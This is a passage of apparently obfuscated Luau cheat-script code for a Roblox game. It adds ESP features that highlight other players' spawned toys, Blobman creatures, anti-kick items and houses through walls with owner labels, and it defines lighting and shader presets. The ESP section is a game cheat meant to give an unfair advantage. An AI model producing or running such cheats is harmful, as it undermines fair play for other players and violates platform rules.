					for _, player in pairs(ps2:GetPlayers()) do
						fn17(player)
					end

					ps2.PlayerAdded:Connect(function(player)
						fn17(player)
					end)

					ps2.PlayerRemoving:Connect(function(player)
						fn13(player)
					end)

					v19:CreateToggle({
						Name = "Enable Highlights",
						Default = false,
						Flag = "HighlightEnable",
						Callback = function(arg)
							flag12 = arg
							fn14()
						end,
					})

					v19:CreateColorPicker({
						Name = "Highlight Color",
						Default = Color3.fromRGB(255, 255, 255),
						Flag = "HighlightColor",
						Callback = function(fillColor)
							color5 = fillColor

							for _, v20 in pairs(tbl16) do
								if v20 then
									v20.FillColor = fillColor
								end
							end
						end,
					})

					v19:CreateSlider({
						Name = "Highlight Transparency",
						Min = 0,
						Max = 10,
						Default = 5,
						Flag = "HighlightTransparency",
						Callback = function(arg)
							fillTransparency = arg / 10

							for _, v20 in pairs(tbl16) do
								if v20 then
									v20.FillTransparency = fillTransparency
								end
							end
						end,
					})

					v19:CreateColorPicker({
						Name = "Outline Color",
						Default = Color3.fromRGB(255, 255, 255),
						Flag = "HighlightOutlineColor",
						Callback = function(outlineColor)
							color6 = outlineColor

							for _, v20 in pairs(tbl16) do
								if v20 then
									v20.OutlineColor = outlineColor
								end
							end
						end,
					})

					v19:CreateSlider({
						Name = "Outline Transparency",
						Min = 0,
						Max = 10,
						Default = 0,
						Flag = "HighlightOutlineTransparency",
						Callback = function(arg)
							outlineTransparency = arg / 10

							for _, v20 in pairs(tbl16) do
								if v20 then
									v20.OutlineTransparency = outlineTransparency
								end
							end
						end,
					})

					lp2.CharacterAdded:Connect(function()
						task.wait()

						if flag12 then
							fn14()
						end
					end)
				end
			end

			local v16
			v16 = _G.VisualTab:CreateBlock({ Name = "Object ESP", Side = "Left", ImageID = "82633060732202" })
			local ps, ws, tbl5, flag7, color, color2, fillTransparency, flag8, tbl6, n25
			local color3, color4, flag9, tbl7, color5, color6, fillTransparency2, flag10, tbl8, tbl9
			local tbl10, tbl11, tbl12, tbl13, tbl14, thread, thread2, thread3, thread4, fn12
			local fn13, fn14, createBillboardGui, fn15, fn16, fn17, fn18, fn19

			do
				local lp = _G.LP
				ps = _G.PS or game:GetService("Players")
				ws = _G.WS
				local n26 = 1000000
				tbl5 = {}
				flag7 = false
				color = Color3.fromRGB(0, 0, 0)
				color2 = Color3.fromRGB(255, 255, 255)
				fillTransparency = 0
				flag8 = false
				tbl6 = {}
				n25 = 1000000
				color3 = Color3.fromRGB(255, 0, 0)
				color4 = Color3.fromRGB(255, 255, 255)
				flag9 = false
				tbl7 = {}
				color5 = Color3.fromRGB(112, 91, 182)
				color6 = Color3.fromRGB(255, 255, 255)
				fillTransparency2 = 0.5
				flag10 = false
				tbl8 = {}
				tbl9 = {}
				tbl10 = {}
				tbl11 = {}
				tbl12 = {}
				tbl13 = {}
				tbl14 = {}
				thread = nil
				thread2 = nil
				thread3 = nil
				thread4 = nil

				local tbl15 = {
					NinjaKunai = true,
					ToolPickaxe = true,
					ToolPencil = true,
					NinjaShuriken = true,
					AntiKick = true,
					AntiKick_House = true,
					NinjaKatana = true,
					ToolDiggingForkRusty = true,
					ToolCleaver = true,
					AntiKickCleaver = true,
				}

				fn12 = function(arg)
					if not arg then
						return nil
					end
					local soundPart = arg:FindFirstChild("SoundPart", true)
					if soundPart and soundPart:IsA("BasePart") then
						return soundPart
					end
					return arg:FindFirstChildWhichIsA("BasePart", true)
				end

				fn13 = function()
					local character = lp.Character
					if not character then
						return nil
					end
					return character:FindFirstChild("HumanoidRootPart")
				end

				fn14 = function(arg, arg2)
					if not arg or not arg.Parent or not arg2 then
						return false
					end
					local position = arg.Position
					local position2 = arg2.Position
					local n27 = position2.X - position.X
					local n28 = position2.Y - position.Y
					local n29 = position2.Z - position.Z
					return n27 * n27 + n28 * n28 + n29 * n29 <= n26
				end

				local function createHighlight(name, fillColor, outlineColor, fillTransparency3, adornee)
					local highlight = Instance.new("Highlight")
					highlight.Name = name
					highlight.Adornee = adornee
					highlight.FillColor = fillColor
					highlight.OutlineColor = outlineColor
					highlight.FillTransparency = fillTransparency3
					highlight.OutlineTransparency = 0
					highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
					highlight.Parent = adornee
					return highlight
				end

				createBillboardGui = function(adornee)
					if not adornee or not adornee.Parent then
						return nil
					end
					local billboardGui = Instance.new("BillboardGui")
					billboardGui.Name = "PlotIcon"
					billboardGui.Adornee = adornee
					billboardGui.Size = UDim2.new(0, 40, 0, 40)
					billboardGui.StudsOffset = Vector3.new(0, 3, 0)
					billboardGui.AlwaysOnTop = true
					billboardGui.Parent = adornee
					local imageLabel = Instance.new("ImageLabel")
					imageLabel.Size = UDim2.new(1, 0, 1, 0)
					imageLabel.BackgroundTransparency = 1
					imageLabel.Image = "rbxassetid://81531453679196"
					imageLabel.Parent = billboardGui
					return billboardGui
				end

				fn15 = function(arg)
					if arg then
						pcall(function()
							arg:Destroy()
						end)
					end
				end

				local function fn20(arg)
					local parent = arg and arg.Parent
					if not parent then
						return nil
					end

					if not string.find(parent.Name, "SpawnedInToys$") then
						return nil
					end
					local v17 = string.gsub(parent.Name, "SpawnedInToys$", "")
					return ps:FindFirstChild(v17)
				end

				fn16 = function(arg)
					if not arg then
						return nil
					end
					local parent = arg.Parent

					if parent then
						local v17 = string.match(parent.Name, "^(.*)SpawnedInToys$")

						if v17 then
							local v18 = ps:FindFirstChild(v17)
							if v18 then
								return v18
							end
						end
					end

					return nil
				end

				local function fn21(arg)
					if not arg or not arg.Parent then
						return nil
					end
					local soundPart = arg:FindFirstChild("SoundPart", true)
					if soundPart and soundPart:IsA("BasePart") then
						return soundPart
					end
					local ediblePart = arg:FindFirstChild("EdiblePart", true)
					if ediblePart and ediblePart:IsA("BasePart") then
						return ediblePart
					end
					local holdPart = arg:FindFirstChild("HoldPart", true)
					if holdPart and holdPart:IsA("BasePart") then
						return holdPart
					end
					return arg:FindFirstChildWhichIsA("BasePart", true)
				end

				local function fn22(arg)
					if not arg or not arg.Parent then
						return false
					end

					if arg.Name ~= "FoodBanana" then
						return false
					end

					if arg:IsA("Model") then
						return true
					end
					return fn21(arg) ~= nil
				end

				local function fn23(arg)
					local v17 = tbl5[arg]
					if not v17 then
						return
					end
					fn15(v17.billboard)
					fn15(v17.highlight)
					tbl5[arg] = nil
				end

				fn17 = function(arg)
					local v17 = tbl6[arg]

					if v17 then
						fn15(v17)
						tbl6[arg] = nil
					end
				end

				fn18 = function(arg)
					local v17 = tbl7[arg]
					if not v17 then
						return
					end
					fn15(v17.highlight)
					fn15(v17.billboard)
					tbl7[arg] = nil
				end

				fn19 = function(arg)
					local v17 = tbl8[arg]
					if not v17 then
						return
					end
					fn15(v17.billboard)
					tbl8[arg] = nil
				end

				local function fn24(arg, arg2)
					if not flag7 or not arg or not arg.Parent then
						return
					end
					local v17 = tbl5[arg]

					if v17 then
						if v17.mainPart and fn14(v17.mainPart, arg2) then
							return
						end

						if not v17.mainPart then
							v17.mainPart = fn12(arg)
						end

						if v17.mainPart and fn14(v17.mainPart, arg2) then
							return
						end
						fn23(arg)
					end

					local v18 = fn12(arg)
					if not v18 or not fn14(v18, arg2) then
						return
					end
					local plotItems = ws:FindFirstChild("PlotItems")
					local v19 = plotItems and arg:IsDescendantOf(plotItems)

					tbl5[arg] = {
						highlight = createHighlight("AK_ESP", color, color2, fillTransparency, arg),
						billboard = nil,
						isFromPlot = v19,
						mainPart = v18,
					}

					if v19 and flag8 then
						tbl5[arg].billboard = createBillboardGui(v18)
					end
				end

				local function fn25(arg, arg2)
					if not flag8 or not arg or not arg.Parent then
						return
					end

					if tbl6[arg] then
						return
					end
					local v17 = fn12(arg) or arg
					if not v17:IsA("BasePart") then
						return
					end

					if not fn14(v17, arg2) then
						return
					end
					tbl6[arg] = createHighlight("House_ESP", color3, color4, 0, arg)
				end

				local function createBillboardGui2(arg)
					if not arg or not arg.Parent then
						return nil
					end
					local v17 = fn12(arg)
					if not v17 then
						return nil
					end
					local v18 = fn20(arg)
					local displayName

					if v18 then
						displayName = v18.DisplayName
					else
						displayName = string.gsub(arg.Parent.Name, "SpawnedInToys$", "")
					end

					local billboardGui = Instance.new("BillboardGui")
					billboardGui.Name = "BlobmanESP"
					billboardGui.Adornee = v17
					billboardGui.Size = UDim2.new(0, 130, 0, 80)
					billboardGui.StudsOffset = Vector3.new(0, 4, 0)
					billboardGui.AlwaysOnTop = true
					billboardGui.Parent = v17
					local imageLabel = Instance.new("ImageLabel")
					imageLabel.Name = "BlobmanIcon"
					imageLabel.Size = UDim2.new(0, 50, 0, 50)
					imageLabel.Position = UDim2.new(0.5, -25, 0, 0)
					imageLabel.BackgroundTransparency = 1
					imageLabel.Image = "rbxassetid://114438280454369"
					imageLabel.Parent = billboardGui
					local textLabel = Instance.new("TextLabel")
					textLabel.Name = "OwnerName"
					textLabel.Size = UDim2.new(1, 0, 0, 25)
					textLabel.Position = UDim2.new(0, 0, 0, 50)
					textLabel.BackgroundTransparency = 1
					textLabel.Text = "Blobman: " .. displayName
					textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
					textLabel.TextStrokeTransparency = 0
					textLabel.TextScaled = true
					textLabel.Font = Enum.Font.SourceSansBold
					textLabel.Parent = billboardGui
					return billboardGui
				end

				local function fn26(arg, arg2)
					if not flag9 or not arg or not arg.Parent then
						return
					end
					local v17 = tbl7[arg]

					if v17 then
						if v17.mainPart and fn14(v17.mainPart, arg2) then
							return
						end
						fn18(arg)
					end

					local v18 = fn12(arg)
					if not v18 or not fn14(v18, arg2) then
						return
					end
					tbl7[arg] = { highlight = createHighlight("Blob_ESP", color5, color6, fillTransparency2, arg), billboard = createBillboardGui2(arg), mainPart = v18 }
				end

				local function fn27(arg)
					if not arg or not arg.Parent then
						return
					end
					local v17 = tbl8[arg]

					if v17 then
						local v18 = fn21(arg)

						if v18 then
							v17.mainPart = v18

							if v17.billboard then
								v17.billboard.Adornee = v18

								if v17.billboard.Parent ~= v18 then
									v17.billboard.Parent = v18
								end
							end
						end

						return
					end

					local v18 = fn21(arg)
					if not v18 then
						return
					end
					local v19 = fn16(arg)
					local displayName

					if v19 then
						displayName = v19.DisplayName
					else
						displayName = string.match(arg.Parent and arg.Parent.Name or "", "^(.*)SpawnedInToys$") or "Unknown"
					end

					local billboardGui = Instance.new("BillboardGui")
					billboardGui.Name = "BananaESP"
					billboardGui.Adornee = v18
					billboardGui.Size = UDim2.new(0, 160, 0, 100)
					billboardGui.StudsOffset = Vector3.new(0, 2.5, 0)
					billboardGui.AlwaysOnTop = true
					billboardGui.Parent = v18
					local textLabel = Instance.new("TextLabel")
					textLabel.Name = "OwnerName"
					textLabel.Size = UDim2.new(1, 0, 0, 30)
					textLabel.Position = UDim2.new(0, 0, 0, 0)
					textLabel.BackgroundTransparency = 1
					textLabel.Text = "Banana: " .. displayName
					textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
					textLabel.TextStrokeTransparency = 0
					textLabel.TextScaled = true
					textLabel.Font = Enum.Font.SourceSansBold
					textLabel.Parent = billboardGui
					local imageLabel = Instance.new("ImageLabel")
					imageLabel.Name = "BananaIcon"
					imageLabel.Size = UDim2.new(0, 50, 0, 50)
					imageLabel.Position = UDim2.new(0.5, -25, 0, 32)
					imageLabel.BackgroundTransparency = 1
					imageLabel.Image = "rbxassetid://121460911257718"
					imageLabel.Parent = billboardGui
					tbl8[arg] = { billboard = billboardGui, mainPart = v18, owner = v19 }
				end

				local function fn28(arg)
					if not arg or not arg.Parent then
						return
					end

					if tbl15[arg.Name] then
						tbl9[arg] = true
					end

					if arg.Name == "AntiKick_House" then
						tbl10[arg] = true
					end

					if arg.Name == "CreatureBlobman" then
						tbl11[arg] = true
					end

					if arg.Name == "FoodBanana" and fn22(arg) then
						tbl12[arg] = true

						if flag10 then
							fn27(arg)
						end
					end
				end

				local function fn29(arg)
					tbl9[arg] = nil
					tbl10[arg] = nil
					tbl11[arg] = nil
					tbl12[arg] = nil
					fn23(arg)
					fn17(arg)
					fn18(arg)
					fn19(arg)
				end

				local function fn30(arg)
					if not arg or tbl13[arg] then
						return
					end
					tbl13[arg] = {}

					for _, child in ipairs(arg:GetChildren()) do
						fn28(child)
					end

					tbl13[arg].added = arg.ChildAdded:Connect(function(child)
						fn28(child)
					end)

					tbl13[arg].removed = arg.ChildRemoved:Connect(function(child)
						fn29(child)
					end)
				end

				local function fn31(arg)
					local v17 = tbl13[arg]

					if v17 then
						for _, v18 in pairs(v17) do
							if v18 then
								v18:Disconnect()
							end
						end

						tbl13[arg] = nil
					end

					for k in pairs(tbl9) do
						if k:IsDescendantOf(arg) then
							fn29(k)
						end
					end

					for k in pairs(tbl10) do
						if k:IsDescendantOf(arg) then
							fn29(k)
						end
					end

					for k in pairs(tbl11) do
						if k:IsDescendantOf(arg) then
							fn29(k)
						end
					end

					for k in pairs(tbl12) do
						if k:IsDescendantOf(arg) then
							fn29(k)
						end
					end
				end

				local function fn32(arg)
					return arg and string.find(arg.Name, "SpawnedInToys$")
				end

				local function fn33()
					for _, child in ipairs(ws:GetChildren()) do
						if fn32(child) then
							fn30(child)
						end
					end

					local plotItems = ws:FindFirstChild("PlotItems")

					if plotItems then
						for _, child in ipairs(plotItems:GetChildren()) do
							fn30(child)
						end

						if not tbl14.plotAdded then
							tbl14.plotAdded = plotItems.ChildAdded:Connect(function(child)
								fn30(child)
							end)
						end

						if not tbl14.plotRemoved then
							tbl14.plotRemoved = plotItems.ChildRemoved:Connect(function(child)
								fn31(child)
							end)
						end
					end

					if not tbl14.workspaceAdded then
						tbl14.workspaceAdded = ws.ChildAdded:Connect(function(child)
							if fn32(child) then
								fn30(child)
							end
						end)
					end

					if not tbl14.workspaceRemoved then
						tbl14.workspaceRemoved = ws.ChildRemoved:Connect(function(child)
							if tbl13[child] then
								fn31(child)
							end
						end)
					end
				end

				fn33()

				local function fn34()
					if not flag7 then
						return
					end
					local v17 = fn13()

					if not v17 then
						for k in pairs(tbl5) do
							fn23(k)
						end

						return
					end

					for k in pairs(tbl9) do
						if not k or not k.Parent then
							fn29(k)
						else
							local v18 = tbl5[k]
							local mainPart = v18 and v18.mainPart or fn12(k)

							if not mainPart then
								if v18 then
									v18.mainPart = nil
								end
							elseif fn14(mainPart, v17) then
								if not v18 then
									fn24(k, v17)
								else
									v18.mainPart = mainPart

									if v18.isFromPlot and flag8 then
										if not v18.billboard then
											v18.billboard = createBillboardGui(mainPart)
										end
									elseif v18.billboard then
										fn15(v18.billboard)
										v18.billboard = nil
									end
								end
							elseif v18 then
								fn23(k)
							end
						end
					end
				end

				local function fn35()
					if not flag8 then
						return
					end
					local v17 = fn13()

					if not v17 then
						for k in pairs(tbl6) do
							fn17(k)
						end

						return
					end

					for k in pairs(tbl10) do
						if not k or not k.Parent then
							fn29(k)
						else
							local v18 = fn12(k) or k
							local v19 = tbl6[k]

							if v18:IsA("BasePart") then
								local position = v18.Position
								local position2 = v17.Position
								local n27 = position2.X - position.X
								local n28 = position2.Y - position.Y
								local n29 = position2.Z - position.Z

								if n27 * n27 + n28 * n28 + n29 * n29 <= n25 then
									if not v19 then
										fn25(k, v17)
									end
								elseif v19 then
									fn17(k)
								end
							elseif v19 then
								fn17(k)
							end
						end
					end
				end

				local function fn36()
					if not flag9 then
						return
					end
					local v17 = fn13()

					if not v17 then
						for k in pairs(tbl7) do
							fn18(k)
						end

						return
					end

					for k in pairs(tbl11) do
						if not k or not k.Parent then
							fn29(k)
						else
							local v18 = tbl7[k]
							local mainPart = v18 and v18.mainPart or fn12(k)

							if mainPart then
								if fn14(mainPart, v17) then
									if not v18 then
										fn26(k, v17)
									else
										v18.mainPart = mainPart

										if v18.billboard then
											v18.billboard.Adornee = mainPart

											if v18.billboard.Parent ~= mainPart then
												v18.billboard.Parent = mainPart
											end
										end
									end
								elseif v18 then
									fn18(k)
								end
							elseif v18 then
								fn18(k)
							end
						end
					end
				end

				local function fn37()
					if not flag10 then
						return
					end

					for k in pairs(tbl12) do
						if not k or not k.Parent then
							fn29(k)
						else
							fn27(k)
							local v17 = tbl8[k]

							if v17 then
								local v18 = fn21(k)

								if v18 then
									v17.mainPart = v18

									if v17.billboard then
										v17.billboard.Adornee = v18

										if v17.billboard.Parent ~= v18 then
											v17.billboard.Parent = v18
										end
									end
								end

								local v19 = fn16(k)

								if v19 and v19 ~= v17.owner then
									v17.owner = v19
									local ownerName = v17.billboard and v17.billboard:FindFirstChild("OwnerName")

									if ownerName then
										ownerName.Text = "Banana: " .. v19.DisplayName
									end
								end
							end
						end
					end
				end

				local function fn38()
					if thread then
						task.cancel(thread)
					end

					thread = task.spawn(function()
						while flag7 do
							fn34()
							task.wait(0)
						end

						thread = nil
					end)
				end

				local function fn39()
					if thread then
						task.cancel(thread)
						thread = nil
					end

					for k in pairs(tbl5) do
						fn23(k)
					end
				end

				local function fn40()
					if thread2 then
						task.cancel(thread2)
					end

					thread2 = task.spawn(function()
						while flag8 do
							fn35()
							task.wait(0)
						end

						thread2 = nil
					end)
				end

				local function fn41()
					if thread2 then
						task.cancel(thread2)
						thread2 = nil
					end

					for k in pairs(tbl6) do
						fn17(k)
					end
				end

				local function fn42()
					if thread3 then
						task.cancel(thread3)
					end

					thread3 = task.spawn(function()
						while flag9 do
							fn36()
							task.wait(0)
						end

						thread3 = nil
					end)
				end

				local function fn43()
					if thread3 then
						task.cancel(thread3)
						thread3 = nil
					end

					for k in pairs(tbl7) do
						fn18(k)
					end
				end

				local function fn44()
					if thread4 then
						task.cancel(thread4)
					end

					for k in pairs(tbl12) do
						if k and k.Parent then
							fn27(k)
						end
					end

					thread4 = task.spawn(function()
						while flag10 do
							fn37()
							task.wait(0.25)
						end

						thread4 = nil
					end)
				end

				local function fn45()
					if thread4 then
						task.cancel(thread4)
						thread4 = nil
					end

					for k in pairs(tbl8) do
						fn19(k)
					end
				end

				local function fn46(arg)
					for _, v17 in pairs(tbl5) do
						if v17.isFromPlot then
							if arg then
								if not v17.billboard and v17.mainPart and v17.mainPart.Parent then
									local v18 = fn13()

									if v18 and fn14(v17.mainPart, v18) then
										v17.billboard = createBillboardGui(v17.mainPart)
									end
								end
							elseif v17.billboard then
								fn15(v17.billboard)
								v17.billboard = nil
							end
						end
					end
				end

				v16:CreateToggle({
					Name = "Banana ESP",
					Default = false,
					Flag = "BananaESP",
					Callback = function(arg)
						flag10 = arg

						if arg then
							fn44()
						else
							fn45()
						end
					end,
				})

				v16:CreateToggle({
					Name = "Stick ESP",
					Default = false,
					Flag = "StickESP",
					Callback = function(arg)
						flag7 = arg

						if arg then
							fn38()
						else
							fn39()
						end

						fn46(flag8)
					end,
				})

				v16:CreateColorPicker({
					Name = "Stick Fill Color",
					Default = Color3.fromRGB(255, 255, 255),
					Flag = "StickFillColor",
					Callback = function(fillColor)
						color = fillColor

						for _, v17 in pairs(tbl5) do
							if v17.highlight then
								v17.highlight.FillColor = fillColor
							end
						end
					end,
				})

				v16:CreateColorPicker({
					Name = "Stick Outline Color",
					Default = Color3.fromRGB(0, 0, 0),
					Flag = "StickOutlineColor",
					Callback = function(outlineColor)
						color2 = outlineColor

						for _, v17 in pairs(tbl5) do
							if v17.highlight then
								v17.highlight.OutlineColor = outlineColor
							end
						end
					end,
				})

				v16:CreateSlider({
					Name = "Stick Transparency",
					Min = 0,
					Max = 10,
					Default = 0,
					Flag = "StickTransparency",
					Callback = function(arg)
						fillTransparency = arg / 10

						for _, v17 in pairs(tbl5) do
							if v17.highlight then
								v17.highlight.FillTransparency = fillTransparency
							end
						end
					end,
				})

				v16:CreateToggle({
					Name = "Stick House ESP (!)",
					Default = false,
					Flag = "HouseESP",
					Callback = function(arg)
						flag8 = arg

						if arg then
							fn40()
						else
							fn41()
						end

						fn46(arg)
					end,
				})

				v16:CreateToggle({
					Name = "ESP All Blobman",
					Default = false,
					Flag = "BlobESP",
					Callback = function(arg)
						flag9 = arg

						if arg then
							fn42()
						else
							fn43()
						end
					end,
				})
			end

			v16:CreateColorPicker({
				Name = "Blobman Fill Color",
				Default = Color3.fromRGB(112, 91, 182),
				Flag = "BlobFillColor",
				Callback = function(fillColor)
					color5 = fillColor

					for _, v17 in pairs(tbl7) do
						if v17 and v17.highlight then
							v17.highlight.FillColor = fillColor
						end
					end
				end,
			})

			v16:CreateColorPicker({
				Name = "Blobman Outline Color",
				Default = Color3.fromRGB(255, 255, 255),
				Flag = "BlobOutlineColor",
				Callback = function(outlineColor)
					color6 = outlineColor

					for _, v17 in pairs(tbl7) do
						if v17 and v17.highlight then
							v17.highlight.OutlineColor = outlineColor
						end
					end
				end,
			})

			v16:CreateSlider({
				Name = "Blobman Transparency",
				Min = 0,
				Max = 10,
				Default = 5,
				Flag = "BlobTransparency",
				Callback = function(arg)
					fillTransparency2 = arg / 10

					for _, v17 in pairs(tbl7) do
						if v17 and v17.highlight then
							v17.highlight.FillTransparency = fillTransparency2
						end
					end
				end,
			})

			local v17
			v17 = _G.VisualTab:CreateBlock({ Name = "Shaders Loader", Side = "Right", ImageID = "6413875420" })
			local Lighting
			Lighting = game:GetService("Lighting")
			local tbl15
			tbl15 = {}

			do
				local tbl16 = {
					name = "Morning",
					data = {
						Lighting = {
							ClockTime = 7,
							Brightness = 1.8,
							Ambient = Color3.fromRGB(180, 190, 220),
							OutdoorAmbient = Color3.fromRGB(180, 190, 220),
							ColorShift_Top = Color3.fromRGB(255, 200, 150),
						},
						Bloom = { Intensity = 0.5, Size = 20, Threshold = 1 },
					},
				}

				local tbl17 = {
					name = "Midday",
					data = {
						Lighting = {
							ClockTime = 14,
							Brightness = 2.5,
							Ambient = Color3.fromRGB(200, 210, 240),
							OutdoorAmbient = Color3.fromRGB(200, 210, 240),
							ColorShift_Top = Color3.fromRGB(255, 255, 255),
						},
						Bloom = { Intensity = 0.3, Size = 18, Threshold = 1.2 },
					},
				}

				local tbl18 = {
					name = "Afternoon",
					data = {
						Lighting = {
							ClockTime = 16,
							Brightness = 2,
							Ambient = Color3.fromRGB(200, 170, 150),
							OutdoorAmbient = Color3.fromRGB(200, 170, 150),
							ColorShift_Top = Color3.fromRGB(255, 200, 150),
						},
						Bloom = { Intensity = 0.4, Size = 22, Threshold = 1 },
					},
				}

				local tbl19 = {
					name = "Evening",
					data = {
						Lighting = {
							ClockTime = 18.5,
							Brightness = 1.5,
							Ambient = Color3.fromRGB(150, 100, 80),
							OutdoorAmbient = Color3.fromRGB(150, 100, 80),
							ColorShift_Top = Color3.fromRGB(255, 150, 100),
							ColorShift_Bottom = Color3.fromRGB(200, 100, 50),
						},
						Bloom = { Intensity = 0.6, Size = 25, Threshold = 0.8 },
					},
				}

				local tbl20 = {
					name = "Night",
					data = {
						Lighting = {
							ClockTime = 22,
							Brightness = 0.3,
							Ambient = Color3.fromRGB(30, 30, 50),
							OutdoorAmbient = Color3.fromRGB(30, 30, 50),
							ColorShift_Top = Color3.fromRGB(20, 30, 50),
						},
						Bloom = { Intensity = 0.1, Size = 15, Threshold = 2 },
					},
				}

				local tbl21 = {
					name = "Midnight",
					data = {
						Lighting = {
							ClockTime = 0,
							Brightness = 0.1,
							Ambient = Color3.fromRGB(10, 10, 30),
							OutdoorAmbient = Color3.fromRGB(10, 10, 30),
							ColorShift_Top = Color3.fromRGB(10, 10, 30),
						},
						Bloom = { Intensity = 0.05, Size = 10, Threshold = 3 },
					},
				}

				local tbl22 = {
					name = "Rain",
					data = {
						Lighting = {
							ClockTime = 12,
							Brightness = 0.6,
							Ambient = Color3.fromRGB(80, 80, 100),
							OutdoorAmbient = Color3.fromRGB(80, 80, 100),
						},
						Atmosphere = {
							Density = 0.8,
							Offset = 0.5,
							Color = Color3.fromRGB(150, 150, 180),
							Decay = Color3.fromRGB(100, 100, 150),
							Glare = 0.1,
							Haze = 5,
						},
						Clouds = { Cover = 0.9, Density = 0.9 },
					},
				}

				local tbl23 = {
					name = "Snow",
					data = {
						Lighting = {
							ClockTime = 12,
							Brightness = 0.8,
							Ambient = Color3.fromRGB(180, 190, 210),
							OutdoorAmbient = Color3.fromRGB(180, 190, 210),
						},
						Clouds = { Cover = 0.8, Density = 0.7 },
					},
				}

				local tbl24 = {
					name = "Fog",
					data = {
						Lighting = {
							ClockTime = 12,
							Brightness = 1,
							Ambient = Color3.fromRGB(180, 180, 190),
							OutdoorAmbient = Color3.fromRGB(180, 180, 190),
							FogEnd = 100,
							FogColor = Color3.fromRGB(180, 180, 190),
							FogStart = 20,
						},
						Atmosphere = { Density = 0.6, Haze = 8, Color = Color3.fromRGB(180, 180, 200) },
					},
				}

				local tbl25 = {
					name = "Sunny",
					data = {
						Lighting = {
							ClockTime = 13,
							Brightness = 3,
							Ambient = Color3.fromRGB(220, 230, 255),
							OutdoorAmbient = Color3.fromRGB(220, 230, 255),
							GlobalShadows = true,
							FogEnd = 100000,
							FogStart = 0,
							FogColor = Color3.fromRGB(255, 255, 255),
						},
						SunRays = { Intensity = 0.3, Spread = 0.6 },
					},
				}

				local tbl26 = {
					name = "Cloudy",
					data = {
						Lighting = {
							ClockTime = 13,
							Brightness = 0.8,
							Ambient = Color3.fromRGB(150, 160, 180),
							OutdoorAmbient = Color3.fromRGB(150, 160, 180),
						},
						Clouds = { Cover = 0.7, Density = 0.5 },
					},
				}

				local tbl27 = {
					name = "Storm",
					data = {
						Lighting = {
							ClockTime = 14,
							Brightness = 0.3,
							Ambient = Color3.fromRGB(50, 50, 70),
							OutdoorAmbient = Color3.fromRGB(50, 50, 70),
						},
						Clouds = { Cover = 1, Density = 0.9 },
						Atmosphere = { Density = 0.9, Haze = 6 },
					},
				}

				local tbl28 = {
					name = "Autumn",
					data = {
						Lighting = {
							ClockTime = 16,
							Brightness = 1.3,
							Ambient = Color3.fromRGB(200, 160, 120),
							OutdoorAmbient = Color3.fromRGB(200, 160, 120),
							ColorShift_Top = Color3.fromRGB(255, 180, 100),
							ColorShift_Bottom = Color3.fromRGB(180, 100, 50),
						},
						Bloom = { Intensity = 0.3, Size = 20 },
					},
				}

				local tbl29 = {
					name = "Spring",
					data = {
						Lighting = {
							ClockTime = 13,
							Brightness = 2,
							Ambient = Color3.fromRGB(200, 220, 200),
							OutdoorAmbient = Color3.fromRGB(200, 220, 200),
							ColorShift_Top = Color3.fromRGB(200, 255, 200),
						},
						Bloom = { Intensity = 0.2, Size = 15 },
					},
				}

				local tbl30 = {
					name = "Summer",
					data = {
						Lighting = {
							ClockTime = 14,
							Brightness = 2.8,
							Ambient = Color3.fromRGB(220, 230, 250),
							OutdoorAmbient = Color3.fromRGB(220, 230, 250),
							ColorShift_Top = Color3.fromRGB(255, 255, 255),
						},
					},
				}

				local tbl31 = {
					name = "Winter",
					data = {
						Lighting = {
							ClockTime = 12,
							Brightness = 1.2,
							Ambient = Color3.fromRGB(200, 210, 230),
							OutdoorAmbient = Color3.fromRGB(200, 210, 230),
							ColorShift_Top = Color3.fromRGB(220, 230, 250),
						},
						Bloom = { Intensity = 0.1, Size = 12 },
					},
				}

				local tbl32 = {
					name = "Red Theme",
					data = {
						Lighting = {
							Ambient = Color3.fromRGB(80, 20, 20),
							OutdoorAmbient = Color3.fromRGB(80, 20, 20),
							ColorShift_Top = Color3.fromRGB(255, 50, 50),
							FogEnd = 100000,
							FogStart = 0,
						},
						ColorCorrection = { Saturation = 0.5, Brightness = 0.2 },
					},
				}

				local tbl33 = {
					name = "Green Theme",
					data = {
						Lighting = {
							Ambient = Color3.fromRGB(20, 80, 20),
							OutdoorAmbient = Color3.fromRGB(20, 80, 20),
							ColorShift_Top = Color3.fromRGB(50, 255, 50),
							FogEnd = 100000,
							FogStart = 0,
						},
						ColorCorrection = { Saturation = 0.5, Brightness = 0.2 },
					},
				}

				local tbl34 = {
					name = "Blue Theme",
					data = {
						Lighting = {
							Ambient = Color3.fromRGB(20, 40, 80),
							OutdoorAmbient = Color3.fromRGB(20, 40, 80),
							ColorShift_Top = Color3.fromRGB(50, 100, 255),
							FogEnd = 100000,
							FogStart = 0,
						},
						ColorCorrection = { Saturation = 0.5, Brightness = 0.2 },
					},
				}

				tbl15[1] = tbl16
				tbl15[2] = tbl17
				tbl15[3] = tbl18
				tbl15[4] = tbl19
				tbl15[5] = tbl20
				tbl15[6] = tbl21
				tbl15[7] = tbl22
				tbl15[8] = tbl23
				tbl15[9] = tbl24
				tbl15[10] = tbl25
				tbl15[11] = tbl26
				tbl15[12] = tbl27
				tbl15[13] = tbl28
				tbl15[14] = tbl29
				tbl15[15] = tbl30
				tbl15[16] = tbl31

				tbl15[17] = {
					name = "Black & White",
					data = {
						Lighting = { FogEnd = 100000, FogStart = 0 },
						ColorCorrection = { Saturation = -1 },
					},
				}

				tbl15[18] = tbl32
				tbl15[19] = tbl33
				tbl15[20] = tbl34
			end

			do
				local tbl16 = {}

				local tbl17 = {
					name = "Golden Sun",
					data = {
						SunRays = { Intensity = 0.15 },
						ColorCorrection = { TintColor = Color3.fromRGB(255, 230, 150) },
					},
				}

				local tbl18 = {
					name = "Darker Shadows",
					data = { Lighting = { OutdoorAmbient = Color3.new(0, 0, 0) } },
				}

				tbl16[1] = { name = "None", data = {} }
				tbl16[2] = { name = "God Rays", data = { SunRays = { Intensity = 0.2, Spread = 1 } } }
				tbl16[3] = tbl17

				tbl16[4] = {
					name = "Ultra Shadows",
					data = { Lighting = { GlobalShadows = true, Brightness = 3 } },
				}

				tbl16[5] = {
					name = "Soft Glow",
					data = { Bloom = { Intensity = 1, Size = 20, Threshold = 0.5 } },
				}

				tbl16[6] = {
					name = "Heavenly Light",
					data = { SunRays = { Intensity = 0.4 }, Bloom = { Intensity = 0.8 } },
				}

				tbl16[7] = tbl18

				tbl16[8] = {
					name = "Volumetric Light",
					data = { Atmosphere = { Density = 0.3, Glare = 0.5, Haze = 1 } },
				}

